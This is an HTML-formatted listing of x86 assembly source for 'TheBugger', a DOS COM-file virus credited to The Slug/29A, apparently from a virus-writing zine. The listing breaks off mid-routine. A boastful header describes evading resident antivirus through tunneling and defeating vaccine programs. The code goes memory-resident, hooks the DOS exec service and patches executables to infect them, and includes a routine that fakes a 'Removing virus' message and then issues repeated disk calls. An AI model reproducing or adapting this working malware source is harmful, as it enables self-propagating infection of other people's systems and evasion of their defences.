<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Slug.872 - 29A_1.5_4.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                      ±±±</span><span class="sc0">
</span><span class="sc1">;±±±    ðððððð ðð ðð ððððð  ðððð  ðð ðð ððððð ððððð ððððð ððððð           ±±±</span><span class="sc0">
</span><span class="sc1">;±±±      ðð   ððððð ðð=    ð==ð  ðð ðð ðð    ðð    ðð=   ðð  ð           ±±±</span><span class="sc0">
</span><span class="sc1">;±±±      ðð   ðð ðð ðð     ð   ð ðð ðð ðð ðð ðð ðð ðð    ðððð            ±±±</span><span class="sc0">
</span><span class="sc1">;±±±      ðð   ðð ðð ððððð  ððððð ððððð ððððð ððððð ððððð ðð  ð  VIRUS.   ±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                      ±±±</span><span class="sc0">
</span><span class="sc1">;±±±              ¯¯¯ A 29A Research Code by The Slug. ®®®                ±±±</span><span class="sc0">
</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">
</span><span class="sc1">;±±± TheBugger   is   a   simple   COM  infector  with  some  interesting ±±±</span><span class="sc0">
</span><span class="sc1">;±±± inprovements.                                                        ±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                      ±±±</span><span class="sc0">
</span><span class="sc1">;±±± Its  first difference with a normal COM virus is the tricky resident ±±±</span><span class="sc0">
</span><span class="sc1">;±±± check;  it's  designed  to avoid lamers writing the typical resident ±±±</span><span class="sc0">
</span><span class="sc1">;±±± program  wich returns the residency code and forces the virus to not ±±±</span><span class="sc0">
</span><span class="sc1">;±±± install  in memory. To avoid that, the virus makes an extra check of ±±±</span><span class="sc0">
</span><span class="sc1">;±±± a random byte in the memory  copy; if the check fails, it jumps to a ±±±</span><span class="sc0">
</span><span class="sc1">;±±± simulated HD formatting routine }:).                                 ±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                      ±±±</span><span class="sc0">
</span><span class="sc1">;±±± Another  interesting feature  is  the tunneling routine. It uses the ±±±</span><span class="sc0">
</span><span class="sc1">;±±± common  code trace method but it starts tracing from PSP call to int ±±±</span><span class="sc0">
</span><span class="sc1">;±±± 21h instead of doing it from normal int 21h vector in order to avoid ±±±</span><span class="sc0">
</span><span class="sc1">;±±± resident antivirus  stopping  trace mode. This call is supported for ±±±</span><span class="sc0">
</span><span class="sc1">;±±± compatibility  with  older  DOS  versions  and  it  has  some little ±±±</span><span class="sc0">
</span><span class="sc1">;±±± diferences with  the normal int 21 handler: first, the function code ±±±</span><span class="sc0">
</span><span class="sc1">;±±± is  passed in  cl  register  (not  in  ah  as usual) and second, the ±±±</span><span class="sc0">
</span><span class="sc1">;±±± function  to  call  can't  be higher  than 24h. These diferences are ±±±</span><span class="sc0">
</span><span class="sc1">;±±± handled  by the O.S. in a separated routine and then it jumps to the ±±±</span><span class="sc0">
</span><span class="sc1">;±±± original  int 21h  handler,  so the tunneling routine only skips the ±±±</span><span class="sc0">
</span><span class="sc1">;±±± first 'compatibility' routines and gets the real int 21h address €:).±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                      ±±±</span><span class="sc0">
</span><span class="sc1">;±±± The last big feature, is the infection method; the virus infects COM ±±±</span><span class="sc0">
</span><span class="sc1">;±±± files  by changing a call in host code to point to it. This call may ±±±</span><span class="sc0">
</span><span class="sc1">;±±± be one between  the second and  fifth. This is done  by intercepting ±±±</span><span class="sc0">
</span><span class="sc1">;±±± the int 21h service 4bh (exec), when a COM file is executed, the vi- ±±±</span><span class="sc0">
</span><span class="sc1">;±±± rus changes its  first word with an int CDh call, it intercepts this ±±±</span><span class="sc0">
</span><span class="sc1">;±±± int and jumps to the int 21h. When the host  starts running, it exe- ±±±</span><span class="sc0">
</span><span class="sc1">;±±± cutes the int CDh and then the virus takes control; it restores host ±±±</span><span class="sc0">
</span><span class="sc1">;±±± first word and changes int 01h to trace host in order to find a call ±±±</span><span class="sc0">
</span><span class="sc1">;±±± to  infect  }:) The use of int CDh can be avoided by tracing int 21h ±±±</span><span class="sc0">
</span><span class="sc1">;±±± until  host  code, but this way we have the same problem of resident ±±±</span><span class="sc0">
</span><span class="sc1">;±±± antivirus.                                                           ±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                      ±±±</span><span class="sc0">
</span><span class="sc1">;±±± And that's all folks :), enjoy it.                                   ±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                      ±±±</span><span class="sc0">
</span><span class="sc1">;±±±                                                                9    ±±±</span><span class="sc0">
</span><span class="sc1">;±±±   The Slug/29A                                             };){|0D==8±±±</span><span class="sc0">
</span><span class="sc1">;±±±   I Love This Job.                                         3---ë-----±±±</span><span class="sc0">
</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc12">'TheBugger'</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">virsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virend</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Main C0de ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">;address t0 return t0 h0st.</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">68h</span><span class="sc0">                       </span><span class="sc1">;push '0ffset'.</span><span class="sc0">
        </span><span class="sc5">retonno</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sig</span><span class="sc0">                       </span><span class="sc1">;get nasty delta 0ffset.</span><span class="sc0">
</span><span class="sc5">sig</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">sig</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0B0h</span><span class="sc0">                </span><span class="sc1">;resident check.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BABAh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">instal</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">lstchk</span><span class="sc0">

</span><span class="sc5">instal</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc0">                   </span><span class="sc1">;get PSP segment.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;get MCB addres.</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">       </span><span class="sc1">;is the last MCB?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">chgmcb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">aprog</span><span class="sc0">

</span><span class="sc5">chgmcb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],(</span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;change bl0ck size in MCB</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],(</span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;&amp; in PSP.</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">                            </span><span class="sc1">;copy to new l0cati0n.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">;jump t0 c0py.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">newcpy</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">newcpy</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">                   </span><span class="sc1">;m0ve call t0 int 21,</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PSPcall</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;fr0m PSP t0 c0py 0f virus.</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;save curent int 21h vect0r.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;) cx=0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">int21</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">tunn</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;hang tunneling code :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">                          </span><span class="sc1">;call int 21h fr0m PSP in trace m0de.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">                   </span><span class="sc1">;get input status function (in cl ;).</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PSPcall</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">hdl21</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;hang new int 21h handler.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">aprog</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">                           </span><span class="sc1">;return t0 h0st.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">lstchk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">;check rand0m w0rd of mem0ry c0py.</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmpsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">aprog</span><span class="sc0">

</span><span class="sc5">buuuhh</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">;display funny message :)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">joke</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0180h</span><span class="sc0">                  </span><span class="sc1">;I think it's clear enought };).</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">07FFh</span><span class="sc0">
</span><span class="sc5">funny</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0401h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">funny</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Data ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">credits</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TheBugger virus by The Slug/29A'</span><span class="sc0">
</span><span class="sc5">intCD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">                      </span><span class="sc1">;int t0 detect h0st execution.</span><span class="sc0">
</span><span class="sc5">PSPcall</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9Ah</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;PSP call t0 int21h ;)</span><span class="sc0">
</span><span class="sc5">joke</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Removing virus from memory...'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±± Int 21h Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">hdl21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0B0h</span><span class="sc0">                </span><span class="sc1">;resident service?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">func2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BABAh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">;return virus segment in es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">;f0r extra check.</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">func2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">                 </span><span class="sc1">;exec service?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">exec</span><span class="sc0">

</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0EAh</span><span class="sc0">                      </span><span class="sc1">;jmp t0 int 21h.</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">exec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;c0py filespec.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">path</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">next</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;is a .c0m file?</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'oc'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">nocom</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">chgattr</span><span class="sc0">                   </span><span class="sc1">;change file attributes.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                 </span><span class="sc1">;0pen file.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getdate</span><span class="sc0">                   </span><span class="sc1">;get file time &amp; date.</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">firstb</span><span class="sc0">                </span><span class="sc1">;read first 3 bytes 0f file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">;t0 exe check &amp; h0st detect rutine.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">firstb</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">;is an exe file (MZ sign)?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">exit</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;g0 t0 file start again.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">                            </span><span class="sc1">;dx &lt;- 0 ;)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">intCD</span><span class="sc0">                 </span><span class="sc1">;write 'int CDh' c0de 0n file start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">;t0 detect h0st execution.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">


        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;change int CDh vect0r</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;f0r h0st detection.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0CDh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">intcddes</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0CDh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">intcdseg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0CDh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fndhst</span><span class="sc4">)</span><span class="sc0">
